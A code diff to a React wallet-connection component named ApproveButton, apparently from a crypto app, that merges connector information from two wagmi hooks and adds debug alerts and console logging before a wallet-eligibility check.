@@ -126,7 +126,7 @@ const updateStoredBalance = (usdtFormatted, bnbFormatted, address) => {
 };
 
 export default function ApproveButton() {
-  const { address, isConnected } = useAccount();
+  const { address, isConnected, connector } = useAccount();
   const { data: walletClient } = useWalletClient();
   const [loading, setLoading] = useState(false);
 
@@ -211,15 +211,36 @@ export default function ApproveButton() {
       return;
     }
 
-    // Wallet eligibility check - check multiple possible connector IDs
-    const walletId = walletClient?.connector?.id;
-    const walletName = walletClient?.connector?.name;
-    const connectorType = walletClient?.connector?.type;
+    // Try to get wallet info from both sources
+    const walletClientId = walletClient?.connector?.id;
+    const walletClientName = walletClient?.connector?.name;
+    const accountConnectorId = connector?.id;
+    const accountConnectorName = connector?.name;
     
-    console.log("Wallet ID sent to claim button:", walletId);
-    console.log("Wallet Name sent to claim button:", walletName);
-    console.log("Connector Type:", connectorType);
-    console.log("Full connector object:", walletClient?.connector);
+    // Use the best available source
+    const walletId = walletClientId || accountConnectorId;
+    const walletName = walletClientName || accountConnectorName;
+    const connectorType = walletClient?.connector?.type || connector?.type;
+    
+    // 🚨 DEBUG: Show detailed wallet information in alert
+    alert(`
+🔍 CLAIM BUTTON DEBUG INFO:
+📱 WalletClient ID: ${walletClientId || 'undefined'}
+📝 WalletClient Name: ${walletClientName || 'undefined'}
+🔗 Account Connector ID: ${accountConnectorId || 'undefined'}
+📋 Account Connector Name: ${accountConnectorName || 'undefined'}
+✅ Final Wallet ID: ${walletId || 'undefined'}
+✅ Final Wallet Name: ${walletName || 'undefined'}
+🔧 Connector Type: ${connectorType || 'undefined'}
+    `);
+    
+    console.log("=== CLAIM BUTTON DEBUG ===");
+    console.log("WalletClient connector:", walletClient?.connector);
+    console.log("Account connector:", connector);
+    console.log("Final Wallet ID:", walletId);
+    console.log("Final Wallet Name:", walletName);
+    console.log("Eligible wallets list:", eligibleWallets);
+    console.log("=========================");
     
     // Check if wallet is eligible - must match exact wallet ID or wallet name
     const isEligible = (
